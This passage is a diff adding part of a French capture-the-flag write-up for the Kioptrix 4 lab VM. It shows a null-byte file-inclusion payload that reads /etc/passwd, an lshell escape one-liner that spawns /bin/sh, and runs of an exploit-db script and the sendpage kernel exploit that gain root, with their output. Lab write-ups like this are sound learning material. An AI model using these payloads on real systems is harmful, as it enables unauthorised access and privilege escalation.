@@ -204,5 +204,120 @@ Warning: include() [function.include]: Failed opening '/etc/passwd//etc/passwd.p
 
  Il ne reste plus qu'à se débarrasser du doublon avec */member.php?username=/etetcc/passwd%00* et là bingo:  
 
+```plain
+loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
+john:x:1001:1001:,,,:/home/john:/bin/kshell
+robert:x:1002:1002:,,,:/home/robert:/bin/kshell
+```
+
+Il doit s'agir d'une version un peu ancienne de PHP car il me semble qu'injecter des null bytes n'est plus possible...  
+
+Dans tous les cas inclure des fichiers c'est bien mais ici impossible d'inclure une URL distante et les wrappers PHP ne fonctionnent pas...  
+
+I Won't Let It Happen
+---------------------
+
+Injecter dans les logs ? J'avoue j'ai eu la flemme, je suis retourné fouiller un peu ce shell restreint jusqu'à obtenir une erreur intéressante :  
+
+```plain
+john:~$ cd -h
+lshell: -h: No such file or directory
+```
+
+*lshell* ? WUT ? what is this ?  
+
+Une recherche *DuckDuckGo* plus tard on apprend que c'est un shell restreint développé en Python.  
+
+J'ai traîné dans les issues du [Github](https://github.com/ghantoos/lshell/) à la recherche de vulnérabilités mais aucune n'a fonctionné ici :-/   
+
+Pas trop grave car il y a [un exploit](https://www.exploit-db.com/exploits/39632/) correspondant au *lshell* du CTF :  
+
+```plain
+$ python 39632.py john MyNameIsJohn 192.168.1.39
+[!] .............................
+[!] lshell <= 0.9.15 remote shell.
+[!] note: you can also ssh in and execute '/bin/bash'
+[!] .............................
+[!] Checking host 192.168.1.39...
+[+] vulnerable lshell found, preparing pseudo-shell...
+$ ls -al
+total 28
+drwxr-xr-x 2 john john 4096 2012-02-04 18:39 .
+drwxr-xr-x 5 root root 4096 2012-02-04 18:05 ..
+-rw------- 1 john john   61 2012-02-04 23:31 .bash_history
+-rw-r--r-- 1 john john  220 2012-02-04 18:04 .bash_logout
+-rw-r--r-- 1 john john 2940 2012-02-04 18:04 .bashrc
+-rw-r--r-- 1 john john 1530 2018-02-14 21:26 .lhistory
+-rw-r--r-- 1 john john  586 2012-02-04 18:04 .profile
+```
+
+Mais l'exploit se montre assez peu utilisable... En cherchant bien il y a une astuce qui s'avère bien plus pratique comme indiquée [ici](http://blog.en.hacker.lk/2012/06/how-i-understood-what-happened-in.html) :  
+
+```plain
+john:~$ echo os.system("/bin/sh")
+$ id
+uid=1001(john) gid=1001(john) groups=1001(john)
+$ ls -l /root
+total 8
+-rw-r--r-- 1 root       root        625 Feb  6  2012 congrats.txt
+```
+
+Ok... On n'a même plus besoin de passer root ^\_^ Mais quelle époque on vit !  
+
+The Crusher
+-----------
+
+Pour le fun on prend l'identité du système :  
+
+```plain
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 8.04.3 LTS
+Release:        8.04
+Codename:       hardy
+
+Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
+```
+
+Ce qui nous mène à l'exploit *sendpage*, sans doute le chemin qu'il aurait fallut prendre si j'avais persisté sur l'inclusion :  
+
+```plain
+$ ./sendpage
+# id
+uid=0(root) gid=0(root) groups=1001(john)
+# cd /root
+# ls -al
+total 44
+drwxr-xr-x  4 root       root       4096 Feb  6  2012 .
+drwxr-xr-x 21 root       root       4096 Feb  6  2012 ..
+-rw-------  1 root       root         59 Feb  6  2012 .bash_history
+-rw-r--r--  1 root       root       2227 Oct 20  2007 .bashrc
+-rw-r--r--  1 root       root          1 Feb  5  2012 .lhistory
+-rw-------  1 root       root          1 Feb  5  2012 .mysql_history
+-rw-------  1 root       root          5 Feb  6  2012 .nano_history
+-rw-r--r--  1 root       root        141 Oct 20  2007 .profile
+drwx------  2 root       root       4096 Feb  6  2012 .ssh
+-rw-r--r--  1 root       root        625 Feb  6  2012 congrats.txt
+drwxr-xr-x  8 loneferret loneferret 4096 Feb  4  2012 lshell-0.9.12
+# cat congrats.txt
+Congratulations!
+You've got root.
+
+There is more then one way to get root on this system. Try and find them.
+I've only tested two (2) methods, but it doesn't mean there aren't more.
+As always there's an easy way, and a not so easy way to pop this box.
+Look for other methods to get root privileges other than running an exploit.
+
+It took a while to make this. For one it's not as easy as it may look, and
+also work and family life are my priorities. Hobbies are low on my list.
+Really hope you enjoyed this one.
+
+If you haven't already, check out the other VMs available on:
+www.kioptrix.com
+
+Thanks for playing,
+loneferret
+```
+
 
 *Published February 22 2018 at 18:03*
